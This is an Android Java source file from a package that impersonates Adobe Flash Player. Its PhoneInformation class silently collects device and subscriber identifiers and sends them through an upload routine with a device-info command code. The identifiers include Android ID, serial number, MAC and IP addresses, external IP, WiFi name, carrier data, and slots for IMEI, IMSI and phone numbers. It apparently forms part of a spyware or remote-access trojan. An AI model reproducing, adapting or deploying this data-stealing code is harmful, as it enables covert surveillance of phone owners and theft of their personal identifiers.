package com.adobe.flashplayer.data;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.Calendar;
import java.util.Enumeration;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.json.JSONObject;
import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.ActivityManager;
import android.app.ActivityManager.MemoryInfo;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Point;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.os.SystemClock;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;
import android.text.format.Formatter;
import android.util.Log;
import android.view.Display;
import android.view.WindowManager;
import androidx.core.content.ContextCompat;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.network.NetworkUitls;
import com.adobe.flashplayer.network.UploadData;



public class PhoneInformation {

    private final static String TAG = "[ljg]PhoneInformation";
    static String cpuDescription = "";
    static String []imsi = new String[2];
    static String []imei = new String[2];
    static String []phone = new String[2];
    static String deviceVer = "";
    static String phoneType = "";
    static String availableMem = "";
    static String totalMem = "";
    static String androidModel = "";
    static String simNumber = "";
    static String simState = "";
    static String subscriberId = "";
    static String voiceMailNumber = "";
    static String countryCode = "";
    static String simnetwork = "";
    static String simnetworkName = "";
    static String simnetworkType = "";
    static String screenheight = "";
    static String screenwidth = "";
    static String mac ="";
    static String ip = "";
    static String netip = "";
    static String verCode;
    static String wifiName = "";
    static String appListString = "";
    static String androidBrand = android.os.Build.BRAND;
    static int androidapiversion = android.os.Build.VERSION.SDK_INT;
    static String androidversion = android.os.Build.VERSION.RELEASE;
    static String deviceID = android.os.Build.ID;
    static String kernelversion;
    static String basebandversion;
    static long devicetime = android .os.Build.TIME;
    static String productname = android .os.Build.PRODUCT;
    static String fingerprint = android.os.Build.FINGERPRINT;
    static String display = android.os.Build.DISPLAY;
    private Context context;


    public PhoneInformation(Context context){
        this.context = context;
    }



    public static String getPhoneInformation(Context context) {
        Log.e(TAG,"start");


        JSONObject jsojbj=new JSONObject();

        try{
            String networkroaming = "";
            int netdatastate = 0;

            String android_id = Secure.getString(context.getContentResolver(), Secure.ANDROID_ID);

            kernelversion = getKernelVersion();

            basebandversion = getBaseBandVersion();

            String strrefreshtime = Utils.formatDate("yyyy-MM-dd HH:mm:ss",devicetime);

            String procname = Utils.getProcessName(context);

            androidModel = android.os.Build.MODEL + "(" + procname +")";

            try{
                cpuDescription = getCpuInfo();
                availableMem = getAvailableMemory(context);
                totalMem = getTotalMemory(context);
                getHeightAndWidth( context);
                verCode = getVerCode(context);
            }catch(Exception ex){
                ex.printStackTrace();
            }


            try {
                TelephonyManager tm = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);

                phoneType = String.valueOf(tm.getPhoneType());

                simnetworkName = tm.getNetworkOperatorName();

                countryCode = tm.getNetworkCountryIso();
                if(countryCode == null || countryCode.equals("")){
                    countryCode = "CN";
                }
                simnetwork = tm.getNetworkOperator();
                int onlinetype = NetworkUitls.getNetworkType(context);
                if (onlinetype  == NetworkUitls.WIRELESS_CONNECTION)
                {
                    simnetworkType = "wireless";
                }
                else{

                    simnetworkType = "wifi";
                }

                simState = String.valueOf(tm.getSimState());

                //voiceMailNumber = tm.getVoiceMailNumber();

                networkroaming = String.valueOf(tm.isNetworkRoaming());
                netdatastate = tm.getDataState();

                //phone[0] = tm.getLine1Number();
                //imei[0] = tm.getDeviceId();
                //imsi[0] = tm.getSubscriberId();

            } catch (Exception e) {
                e.printStackTrace();
            }


            try {

                WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
                WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                wifiName = wifiInfo.getSSID();

            } catch (Exception e) {
                e.printStackTrace();
            }



            try{
                ip = getIPAddress(context);
                mac = getMacAddress();
            }catch(Exception ex){
                ex.printStackTrace();
            }


            try {
                netip = getInetIpAddr(context);
                if (netip == "") {
                    netip = getNetIPFromChinaz(context);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }





            jsojbj.put("IMEI0", imei[0]);
            jsojbj.put("型号", androidModel);
            jsojbj.put("sim卡状态", simState);
            jsojbj.put("商标", androidBrand);
            jsojbj.put("手机号码1", phone[0]);
            jsojbj.put("设备版本", deviceVer);
            jsojbj.put("网络类型", simnetworkType);
            jsojbj.put("电池信息", getBattery(context));

            jsojbj.put("系统最近更新时间", strrefreshtime);
            jsojbj.put("SD卡容量", getSDTotalSize(context));
            jsojbj.put("国家", countryCode);
            jsojbj.put("root", false);
            jsojbj.put("外网IP地址", netip);

            jsojbj.put("API版本", androidapiversion);
            jsojbj.put("MAC地址", mac);
            jsojbj.put("制造商", android.os.Build.MANUFACTURER);
            jsojbj.put("IP地址", ip);
            jsojbj.put("SD剩余容量", getSDAvailableSize(context));
            jsojbj.put("总内存", totalMem);

            jsojbj.put("sim卡号", simNumber);
            jsojbj.put("指纹", fingerprint);
            jsojbj.put("IMSI0", imsi[0]);
            jsojbj.put("Kernel版本", kernelversion);
            jsojbj.put("分辨率", screenwidth + "*" + screenheight);
            jsojbj.put("序列号", android.os.Build.SERIAL);

            jsojbj.put("网络",simnetworkType);


            jsojbj.put("可用内存", availableMem);
            jsojbj.put("cpu信息", cpuDescription);
            jsojbj.put("网络名称", simnetworkName);
            jsojbj.put("版本", androidversion);
            jsojbj.put("已启动时间", getBootTime());
            jsojbj.put("USER", android.os.Build.USER);
            jsojbj.put("屏幕", display);
            jsojbj.put("设备ID", deviceID);
            jsojbj.put("产品名称", productname);
            jsojbj.put("数据连接状态", netdatastate);
            jsojbj.put("是否漫游", networkroaming);
            jsojbj.put("android ID", android_id);
            jsojbj.put("基带版本", basebandversion);
            jsojbj.put("运营商", subscriberId);
            jsojbj.put("WIFI", wifiName);


            jsojbj.put("IMEI1", imei[1]);
            jsojbj.put("IMSI1", imsi[1]);
            jsojbj.put("手机号码2", phone[1]);
            jsojbj.put("语音信箱", voiceMailNumber);


            UploadData.upload(jsojbj.toString().getBytes(), jsojbj.toString().getBytes().length, Public.CMD_DATA_DEVICEINFO, Public.IMEI);


	    	/*
	        ret =
	        "手机型号:" + androidModel + "\r\n" +
	        "设备商标:" + androidBrand  + "\r\n"+
	        "Android版本:" + androidversion + "\r\n" +
	        "API版本:" + androidapiversion + "\r\n" +
	        "系统最近更新时间:" + strdevicetime + "\r\n" +
			"产品名称:" + productname + "\r\n" +
			"设备指纹:" + fingerprint + "\r\n"+
			"屏幕显示:" + display + "\r\n" +
			//"时间:" + ByteArrayProcess.formatDate("yyyy-MM-dd hh:MM:ss", android.os.Build.TIME) + "\r\n" +
	        "设备制造商:" + android.os.Build.MANUFACTURER + "\r\n" +
	        "序列号:" + android.os.Build.SERIAL + "\r\n" +
	        "USER:" + android.os.Build.USER + "\r\n" +
	        "设备ID:" + deviceID + "\r\n" +
	        "设备版本:" + deviceVer + "\r\n" +
	        "Kernel版本:" + kernelversion + "\r\n" +
	        "基带版本:" + basebandversion + "\r\n" +
			"cpu信息:" + cpuDescription + "\r\n" +
			"总内存大小:" + totalMem + "\r\n" +
	        "可用内存大小:" + availableMem  + "\r\n"+
	        "屏幕分辨率:" + width + "*" + height + "\r\n" +
			"SD卡容量:" + getSDTotalSize(context) + "\r\n" +
	        "SD卡剩余容量:" + getSDAvailableSize(context) + "\r\n" +
	        getBattery(context) +
	        getBootTime() +
	        "IMEI0:" + imei[0] + " IMEI1:" + imei[1]+ "\r\n"+
	        "IMSI0:" + imsi[0] + " IMSI1:"+imsi[1] + "\r\n" +
	        "Phone0:" + phone[0] + " Phone1:"+ phone[1] + "\r\n" +
	        "sim卡号:" + simNumber + " sim卡状态:" + simState + "\r\n" +
	        "网络:" + network + " 网络名称:" + networkName + " 网络类型:" + networkType + " 是否漫游:"+ tm.isNetworkRoaming() +" 数据连接状态:" + tm.getDataState()+"\r\n" +
	        "国家:" + countryCode + " 语音信箱:" + voiceMailNumber + " 运营商:" + subscriberId + "\r\n" +
	        "MAC地址:" + mac + "\r\n" +
	        "IP地址:" + ip + "\r\n" +
	        "外网IP地址:" + getMobileV4IP() + "\r\n" +
	        "当前连接的wifi名称:" + wifiName + "\r\n\r\n";
	        */

        }catch(Exception ex){
            ex.printStackTrace();
            String error = Utils.getExceptionDetail(ex);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile("phone information exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
        }

        return jsojbj.toString();
        //return ret;
    }



    public static String getAndroidID(Context context){
        String androidId = Secure.getString(context.getContentResolver(), Secure.ANDROID_ID);
        return androidId;
    }


    /*获取mac地址有一点需要注意的就是android 6.0版本后，以下注释方法不再适用，不管任何手机都会返回"02:00:00:00:00:00"这个默认的mac地址，
     这是googel官方为了加强权限管理而禁用了getSYstemService(Context.WIFI_SERVICE)方法来获得mac地址。
    String macAddress= "";
    WifiManager wifiManager = (WifiManager) MyApp.getContext().getSystemService(Context.WIFI_SERVICE);
    WifiInfo wifiInfo = wifiManager.getConnectionInfo();
    macAddress = wifiInfo.getMacAddress();
    return macAddress;
    */
    public static String getMacAddress(){
        NetworkInterface ethni = null;
        NetworkInterface wifini = null;
        StringBuffer ethaddrbuf = new StringBuffer();
        StringBuffer wifiaddrbuf = new StringBuffer();
        try {
            ethni = NetworkInterface.getByName("eth1");

            if (ethni != null ) {
                byte[] addr = ethni.getHardwareAddress();

                for (byte b : addr) {
                    ethaddrbuf.append(String.format("%02X:", b));
                }
                if (ethaddrbuf.length() > 0) {
                    ethaddrbuf.deleteCharAt(ethaddrbuf.length() - 1);
                }
            }
//			else{
//				ethni = NetworkInterface.getByName("eth0");
//				byte[] addr = ethni.getHardwareAddress();
//
//				for (byte b : addr) {
//					ethaddrbuf.append(String.format("%02X:", b));
//			    }
//			    if (ethaddrbuf.length() > 0) {
//			    	ethaddrbuf.deleteCharAt(ethaddrbuf.length() - 1);
//			    }
//			}

            wifini = NetworkInterface.getByName("wlan0");
            if (wifini != null) {
                byte[] addr = wifini.getHardwareAddress();

                for (byte b : addr) {
                    wifiaddrbuf.append(String.format("%02X:", b));
                }
                if (wifiaddrbuf.length() > 0) {
                    wifiaddrbuf.deleteCharAt(wifiaddrbuf.length() - 1);
                }
            }

            String ret = "";
            if (wifiaddrbuf.toString().equals("") == false) {
                ret = ret + "(WIFI MAC)" + wifiaddrbuf.toString() + " ";
            }

            if(ethaddrbuf.toString().equals("") == false){
                ret = ret + "(mobile MAC)" + ethaddrbuf.toString() + " ";
            }

            return ret;
        } catch (SocketException ex) {
            ex.printStackTrace();
            String error = Utils.getExceptionDetail(ex);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile("getMacAddress exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
            return "02:00:00:00:00:02";
        }
    }





    public static String getIPAddress(Context context) {
        try {
            NetworkInfo info = ((ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo();
            if (info != null && info.isConnected()) {
                if (info.getType() == ConnectivityManager.TYPE_MOBILE) {

                    //Enumeration<NetworkInterface> en=NetworkInterface.getNetworkInterfaces();
                    for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements(); ) {
                        NetworkInterface ni = en.nextElement();
                        for (Enumeration<InetAddress> enumIpAddr = ni.getInetAddresses(); enumIpAddr.hasMoreElements(); ) {
                            InetAddress inetAddress = enumIpAddr.nextElement();

                            if (!inetAddress.isLoopbackAddress() && inetAddress instanceof Inet4Address) {
                                return inetAddress.getHostAddress();
                            }
                        }
                    }
                } else if (info.getType() == ConnectivityManager.TYPE_WIFI) {
                    WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
                    WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                    String ipAddress = Utils.intIP2StringIP(wifiInfo.getIpAddress());
                    return "(wifi)" + ipAddress;
                }
            } else {
                return "当前无网络连接";
            }
        }catch(Exception ex){
            ex.printStackTrace();
            String error = Utils.getExceptionDetail(ex);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile("getIPAddress exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
            return null;
        }
        return null;
    }

    public static void getHeightAndWidth(Context context){
        WindowManager wm = (WindowManager)context.getSystemService(Context.WINDOW_SERVICE);
        Display display = wm.getDefaultDisplay();
        Point point = new Point();
        display.getSize(point);
        screenwidth = String.valueOf(point.x);
        screenheight = String.valueOf(point.y);
        return;
    }



    public static String getVerCode(Context context) {
        String verCode = "";
        try {
            String packageName = context.getPackageName();
            verCode = String.valueOf(context.getPackageManager().getPackageInfo(packageName, 0).versionCode);
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            return "";
        }
        return verCode;
    }


    private static String getCpuInfo() {
        String strfilename = "/proc/cpuinfo";
        String temp = "";
        String cpuinfo = "";
        try {
            FileReader fr = new FileReader(strfilename);
            BufferedReader localBufferedReader = new BufferedReader(fr, 4096);
            while((temp = localBufferedReader.readLine()) != null){
                temp = temp.replace("Processor\\t: ", "");

                temp = temp.replace("\\", "");
                temp = temp.replace(":", "");
                temp = temp.replace("\"", "");
                temp = temp.replace("\'", "");
                temp = temp.replace("\t", "");
                temp = temp.replace("\r", "");
                temp = temp.replace("\n", "");
                cpuinfo = cpuinfo + temp;
                break;
            }


            localBufferedReader.close();
            return cpuinfo;
        } catch (IOException e) {
            return "";
        }
    }

    private static String getAvailableMemory(Context context) {
        ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        MemoryInfo mi = new MemoryInfo();
        am.getMemoryInfo(mi);
        return Formatter.formatFileSize(context, mi.availMem);
    }


    private static String getTotalMemory(Context context) {
        ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        MemoryInfo mi = new MemoryInfo();
        am.getMemoryInfo(mi);
        return Formatter.formatFileSize(context, mi.totalMem);

    }



    public static String getBaseBandVersion() {
        String version = "";
        try {
            Class<?> clazz= Class.forName("android.os.SystemProperties");
            Object object = clazz.newInstance();
            Method method = clazz.getMethod("get", new Class[]{String.class, String.class});
            Object result = method.invoke(object, new Object[]{"gsm.version.baseband", "no message"});
            version = (String) result;
        } catch (Exception e) {
            return version;
        }
        return version;
    }


    public static String getKernelVersion() {
        Process process = null;
        String kernelVersion = "";
        try {
            process = Runtime.getRuntime().exec("cat /proc/version");
        } catch (IOException e) {
            e.printStackTrace();
        }
        InputStream inputStream = process.getInputStream();
        InputStreamReader inputStreamReader = new InputStreamReader(inputStream);
        BufferedReader bufferedReader = new BufferedReader(inputStreamReader, 4096);
        String result = "";
        String info;
        try {
            while ((info = bufferedReader.readLine()) != null) {
                result += info;
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        try {
            if (result != null && result.equals("") == false) {
                String keyword = "version ";
                int index = result.indexOf(keyword);
                info = result.substring(index + keyword.length());
                index = info.indexOf(" ");
                kernelVersion = info.substring(0, index);
            }
        } catch (IndexOutOfBoundsException e) {
            e.printStackTrace();
        }
        return kernelVersion;
    }


    public static String getSDTotalSize(Context context) {
        File path = Environment.getExternalStorageDirectory();
        StatFs stat = new StatFs(path.getPath());
        @SuppressWarnings("deprecation")
        long blockSize = stat.getBlockSize();
        @SuppressWarnings("deprecation")
        long totalBlocks = stat.getBlockCount();
        return Formatter.formatFileSize(context, blockSize * totalBlocks);
    }


    public static String getSDAvailableSize(Context context) {
        File path = Environment.getExternalStorageDirectory();
        StatFs stat = new StatFs(path.getPath());

        long blockSize = stat.getBlockSize();

        long availableBlocks = stat.getAvailableBlocks();
        return Formatter.formatFileSize(context, blockSize * availableBlocks);
    }



    @SuppressLint("InlinedApi") public static String getBattery(Context context){

        String batteryinfo = "";

        if (Build.VERSION.SDK_INT >= 21 ) {
            BatteryManager batteryManager=(BatteryManager)context.getSystemService("batterymanager");
            batteryinfo =  "电池电量:" + batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CURRENT_AVERAGE) +
                    " 充电电量:" + batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) + "%";;
        }else{
            batteryinfo =
                    " 充电电量不可获取";
        }

        return batteryinfo;
    }


    public static String getBootTime() {
        String boottime = "";
        if (Build.VERSION.SDK_INT >= 17 ) {
            long seconds =  SystemClock.elapsedRealtimeNanos() / 1000000000;
            long hour = seconds/3600;
            seconds = seconds%3600;
            long minute = seconds/60;
            seconds = seconds%60;

            boottime = "开机时间:" + String.valueOf(hour) + "时" + String.valueOf(minute) + "分" + String.valueOf(seconds) + "秒";
        }
        return boottime;
    }


    public static String getInetIpAddr(Context context){
        String ipstr = "";
        try {
            //String urlString = "http://icanhazip.com/";
            String urlString = "http://api.ipify.org/";
            ipstr = NetworkUitls.sendHttpGet(context,"GET",urlString,"", "");
        } catch (Exception e) {
            e.printStackTrace();
        }

        return ipstr;
    }



    public static String getNetIPFromIP138(Context context){

        String ip = "";
        try{

            Calendar cale = Calendar.getInstance();
            int year = cale.get(Calendar.YEAR);
            String stryear = String.valueOf(year);

            String urlString = "http://" + stryear + ".ip138.com/";
            String ipstr = NetworkUitls.sendHttpGet(context,"GET",urlString,"", "");
            //String ipstr = HttpUtils.sendHttpGet(context,"GET","http://2019.ip138.com/ic.asp","", "", "", "");
            if (ipstr != null) {
                int pos = ipstr.indexOf("<center>");
                if(pos >0){
                    ip = ipstr.substring(pos + "<center>".length());
                    pos = ip.indexOf("[");
                    if (pos > 0) {
                        ip = ip.substring(pos + "[".length());

                        pos = ip.indexOf("</center>");
                        if(pos > 0){
                            ip = ip.substring(0,pos);

                            pos = ip.indexOf("]");
                            if (pos > 0) {
                                ip = ip.substring(0,pos);
                            }
                        }
                    }
                }
            }
        }catch(Exception ex){
            ex.printStackTrace();
        }
        return ip;
    }




    public static String getNetIPFromChinaz(Context context){
        String ip="";
        try{
            String result = NetworkUitls.sendHttpGet(context,"GET","http://ip.chinaz.com/","","");//http://ip.chinaz.com is error?

            Pattern p = Pattern.compile("\\<dd class\\=\"fz24\">(.*?)\\<\\/dd>");
            Matcher m = p.matcher(result.toString());
            if(m.find()){
                String ipstr = m.group(1);
                ip = ipstr;
            }
        }catch(Exception ex){
            ex.printStackTrace();
        }
        return ip;
    }








    public static String getIMSIAddressFromTHEX(Context context,String imsi){
        if (imsi == null || imsi.equals("") == true) {
            return "";
        }

        String result = NetworkUitls.sendHttpGet(context,"GET","http://the-x.cn/imsi.aspx" + "#" +"imsi=" + imsi,"","");
        if(result == null || result.equals("") == true){
            return "";
        }
        int citypos = result.indexOf("\"city\":\"");
        citypos += "\"city\":\"".length();
        String city = result.substring(citypos);
        int cityend = city.indexOf("\"");
        city = city.substring(0,cityend);

        int provincepos = result.indexOf("\"province\":\"");
        provincepos += "\"province\":\"".length();
        String province = result.substring(provincepos);
        int provinceend = province.indexOf("\"");
        province = province.substring(0,provinceend);

        return province + "省" + city + "市";
    }








}
